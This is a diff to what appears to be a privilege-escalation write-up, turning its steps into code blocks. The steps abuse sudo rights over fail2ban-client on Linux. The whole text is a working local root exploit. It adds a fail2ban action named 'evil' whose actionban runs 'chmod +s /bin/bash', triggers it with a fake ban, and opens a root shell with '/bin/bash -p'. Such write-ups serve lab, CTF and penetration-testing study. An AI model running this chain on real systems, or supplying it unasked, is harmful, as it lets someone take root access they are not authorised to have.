@@ -84,21 +84,35 @@ sudo -l
 
 # Exploit : 
 
-step 1:
+## step 1:
 ### Get jail list
 
-**sudo /usr/bin/fail2ban-client status**
+```
+sudo /usr/bin/fail2ban-client status
+```
 
 ## step 2 : 
+
+```
 ### Choose one of the jails from the "Jail list" in the output.
+
 sudo /usr/bin/fail2ban-client get <JAIL> actions
+
 # Create a new action with arbitrary name (e.g. "evil")
+
 sudo /usr/bin/fail2ban-client set <JAIL> addaction evil
+
 # Set payload to actionban
+
 sudo /usr/bin/fail2ban-client set <JAIL> action evil actionban "chmod +s /bin/bash"
+
 # Trigger the action
+
 sudo /usr/bin/fail2ban-client set <JAIL> banip 1.2.3.5
+
 # Now we gain a root
+
 /bin/bash -p
 
+```
 
